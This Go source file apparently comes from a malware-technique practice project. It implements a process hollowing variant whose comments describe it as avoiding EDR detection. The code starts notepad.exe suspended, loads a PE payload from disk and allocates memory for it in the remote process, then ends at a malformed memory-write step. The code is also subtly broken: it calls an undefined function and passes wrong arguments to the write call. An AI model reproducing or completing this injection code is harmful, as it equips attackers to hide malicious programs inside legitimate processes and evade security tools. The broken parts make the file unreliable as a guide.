package main

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

/*
Traditional process hollowing steps (--> suspicious to EDRs):

	1. Create a suspended process.
-->	2. Unmap the suspended process's binary image.
	3. Write the PE payload into the same address as the legit process's image.
	4. Perform Relocation.
	5. Fix memory permissions.
	6. Perform thread hijacking to run the payload's entry point.
	7. Resume the process.

Improved process hollowing steps that avoids unmapping the legit process's binary image which
is seen as highly suspicious by EDRs:
	1. Create a suspended process.
	2. Write the PE payload into its preferred base address in the remote process.
	3. Patch `ImageBaseAddress` in the PEB.
	4. Fix memory permissions.
	5. Perform thread hijacking to run the payload's entry point.
	6. Resume the process.
*/

var targetProcess *uint16
var startupInfoEx StartupInfoEx
var pThreadAttribList PROC_THREAD_ATTRIBUTE_LIST

const CREATE_SUSPENDED uint32 = 0x00000004
const NO_CREATION_FLAGS uint32 = 0x00000000

func init() {
	var err error

	// Setup the target process.
	targetProcess, err = syscall.UTF16PtrFromString("C:\\Windows\\System32\\notepad.exe")
	if err != nil {
		log.Fatal("Error converting string to UTF16: ", err)
	}

	// Setup the StartupInfoEx.
	startupInfoEx.Cb = uint32(unsafe.Sizeof(startupInfoEx))
	startupInfoEx.AttributeList = &pThreadAttribList
}

// Create the hollowed process.
func main() {
	// Read the PE payload from the disk.
	pePayload, size := readFileFromDisk()
	fmt.Printf("Read %d bytes from the PE payload\n", size)

	// Get the ImageBase of the PE payload.
	payloadNTHeaders, err := getPeNtHeaders64(pePayload)
	if err != nil {
		log.Fatal("Error getting the ImageBase of the PE payload: ", err)
	}

	fmt.Printf("%+v\n", payloadNTHeaders)

	fmt.Printf(
		"ImageBase (preferred mem loc) of the PE payload: 0x%x (size: 0x%x)\n",
		payloadNTHeaders.OptionalHeader.ImageBase,
		payloadNTHeaders.OptionalHeader.SizeOfImage,
	)

	// Process info will be stored here.
	procInfo := windows.ProcessInformation{}

	// 1. Create the process in a suspended state.
	err = CreateProcess(
		nil,
		targetProcess,
		nil,
		nil,
		false,
		CREATE_SUSPENDED,
		nil,
		nil,
		&startupInfoEx,
		&procInfo,
	)
	if err != nil {
		log.Fatal("Error creating process: ", err)
	}

	fmt.Printf("Process created in suspended state --> %+v\n", procInfo)

	// 2. Write the PE payload into the remote process.
	pRemoteAddress, err := VirtualAllocEx(
		procInfo.Process,
		uintptr(payloadNTHeaders.OptionalHeader.ImageBase),
		uintptr(payloadNTHeaders.OptionalHeader.SizeOfImage),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		log.Fatal("Error allocating memory in the remote process: ", err)
	}

	fmt.Printf("Allocated memory in the remote process at 0x%x\n", pRemoteAddress)

	if pRemoteAddress != uintptr(payloadNTHeaders.OptionalHeader.ImageBase) {
		log.Fatal("Remote address doesn't match the preferred ImageBase - relocations not supported")
	}

	// Convert payloadNTHeaders to *byte for lpBuffer *byte in WriteProcessMemory.
	ntHeadersBuf := new(bytes.Buffer)
	err = binary.Write(ntHeadersBuf, binary.LittleEndian, payloadNTHeaders)
	if err != nil {
		log.Fatal("Error converting payloadNTHeaders to *byte: ", err)
	}

	// 3. Patch the ImageBase in the PEB.
	WriteProcessMemory(
		procInfo.Process, // Handle to the remote process
		pRemoteAddress,   // Ptr to the base address in the remote process
		&ntHeadersBuf,    // Ptr to the local buffer containing data to be written to the remote process
		nil,              // number of bytes to be written
		nil,              // actual number of bytes written [out]
	)
}

// Read the PE payload from the disk.
func readFileFromDisk() (contents []byte, size int) {
	file, err := os.Open("../../payloads/benign_go_exe/benign_go.exe")
	if err != nil {
		log.Fatal("Couldn't open payload file: ", err)
	}

	fileInfo, err := file.Stat()
	if err != nil {
		log.Fatal("Couldn't get file info: ", err)
	}

	size = int(fileInfo.Size())
	contents = make([]byte, size)

	_, err = file.Read(contents)
	if err != nil {
		log.Fatal("Couldn't read file: ", err)
	}

	return contents, size
}

// Quick and dirty way to get the ImageBase of the PE payload (64 bit only)
func getPeOptionalHeader64(peContents []byte) (*IMAGE_OPTIONAL_HEADER_64, error) {
	if len(peContents) < 0x40 {
		return nil, errors.New("PE contents too short")
	}

	// Read the e_lfanew field from the DOS header to find the PE header offset
	e_lfanewOffset := int(binary.LittleEndian.Uint32(peContents[0x3C:0x40]))
	if len(peContents) < e_lfanewOffset+4+20+2 { // Check there's enough data for the PE header and COFF File Header
		return nil, errors.New("Invalid e_lfanew offset")
	}

	peHeaderOffset := e_lfanewOffset + 4 // Skip over the "PE\0\0" signature

	// Calculate the start of the Optional Header, immediately after the COFF File Header
	optionalHeaderStart := peHeaderOffset + 20 // COFF File Header is 20 bytes

	// Before proceeding, ensure we're dealing with a PE32+ file by checking the Magic number
	if binary.LittleEndian.Uint16(peContents[optionalHeaderStart:optionalHeaderStart+2]) != 0x20B {
		return nil, errors.New("Not a PE32+ (64-bit) file")
	}

	// Create a reader for the optional header part
	reader := bytes.NewReader(peContents[optionalHeaderStart:])

	// Allocate an IMAGE_OPTIONAL_HEADER_64 struct
	var header IMAGE_OPTIONAL_HEADER_64

	// Read the optional header into the struct
	err := binary.Read(reader, binary.LittleEndian, &header)
	if err != nil {
		return nil, err
	}

	return &header, nil
}
